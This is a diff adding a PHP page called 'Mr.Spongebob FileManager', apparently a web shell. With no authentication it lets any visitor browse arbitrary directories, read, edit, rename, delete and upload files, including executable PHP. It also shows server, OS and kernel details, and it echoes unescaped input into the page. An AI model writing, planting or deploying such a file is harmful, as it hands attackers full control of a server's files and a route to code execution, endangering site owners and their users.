@@ -1,0 +1,131 @@
+<?php
+// Error reporting for debugging (remove in production)
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+// Set the current directory
+$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
+$current_dir = realpath($current_dir);
+
+// File operations
+if (isset($_POST['action'])) {
+    switch ($_POST['action']) {
+        case 'upload':
+            if (isset($_FILES['file'])) {
+                $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
+                move_uploaded_file($_FILES['file']['tmp_name'], $target_file);
+            }
+            break;
+        case 'rename':
+            if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
+                rename($current_dir . '/' . $_POST['old_name'], $current_dir . '/' . $_POST['new_name']);
+            }
+            break;
+        case 'delete':
+            if (isset($_POST['filename'])) {
+                unlink($current_dir . '/' . $_POST['filename']);
+            }
+            break;
+        case 'edit':
+            if (isset($_POST['filename']) && isset($_POST['content'])) {
+                file_put_contents($current_dir . '/' . $_POST['filename'], $_POST['content']);
+            }
+            break;
+    }
+}
+
+// File editing
+$edit_file = isset($_GET['edit']) ? $_GET['edit'] : '';
+$file_content = '';
+if ($edit_file) {
+    $file_content = file_get_contents($current_dir . '/' . $edit_file);
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mr.Spongebob FileManager</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
+        h1, h2 { color: #333; }
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        .actions { display: flex; gap: 10px; }
+        .actions form { margin: 0; }
+        textarea { width: 100%; height: 300px; }
+    </style>
+</head>
+<body>
+    <h1>Mr.Spongebob FileManager</h1>
+    
+    <h2>Server Information</h2>
+    <p>Server: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
+    <p>System: <?php echo php_uname('s') . ' ' . php_uname('r'); ?></p>
+    <p>Kernel: <?php echo php_uname('v'); ?></p>
+
+    <!-- <h2>Current Directory: <?php echo $current_dir; ?></h2> -->
+
+    <h3>Upload File</h3>
+    <form action="" method="post" enctype="multipart/form-data">
+        <input type="hidden" name="action" value="upload">
+        <input type="file" name="file">
+        <input type="submit" value="Upload">
+    </form>
+
+    <h3>Directory Contents</h3>
+    <table>
+        <tr>
+            <th>Name</th>
+            <th>Type</th>
+            <th>Size</th>
+            <th>Actions</th>
+        </tr>
+        <?php
+        $items = scandir($current_dir);
+        foreach ($items as $item) {
+            if ($item == '.' || $item == '..') continue;
+            $full_path = $current_dir . '/' . $item;
+            $is_dir = is_dir($full_path);
+            echo "<tr>";
+            echo "<td>" . ($is_dir ? "<a href='?dir=$full_path'>$item</a>" : $item) . "</td>";
+            echo "<td>" . ($is_dir ? "Directory" : "File") . "</td>";
+            echo "<td>" . ($is_dir ? "-" : filesize($full_path) . " bytes") . "</td>";
+            echo "<td class='actions'>";
+            if (!$is_dir) {
+                echo "<form action='' method='post'>
+                        <input type='hidden' name='action' value='rename'>
+                        <input type='hidden' name='old_name' value='$item'>
+                        <input type='text' name='new_name' value='$item'>
+                        <input type='submit' value='Rename'>
+                      </form>";
+                echo "<form action='' method='post'>
+                        <input type='hidden' name='action' value='delete'>
+                        <input type='hidden' name='filename' value='$item'>
+                        <input type='submit' value='Delete'>
+                      </form>";
+                echo "<a href='?edit=$item'>Edit</a>";
+                echo "<a href='$full_path' download>Download</a>";
+            }
+            echo "</td>";
+            echo "</tr>";
+        }
+        ?>
+    </table>
+
+    <?php if ($edit_file): ?>
+    <h3>Edit File: <?php echo $edit_file; ?></h3>
+    <form action="" method="post">
+        <input type="hidden" name="action" value="edit">
+        <input type="hidden" name="filename" value="<?php echo $edit_file; ?>">
+        <textarea name="content"><?php echo htmlspecialchars($file_content); ?></textarea>
+        <input type="submit" value="Save">
+    </form>
+    <?php endif; ?>
+
+</body>
+</html>
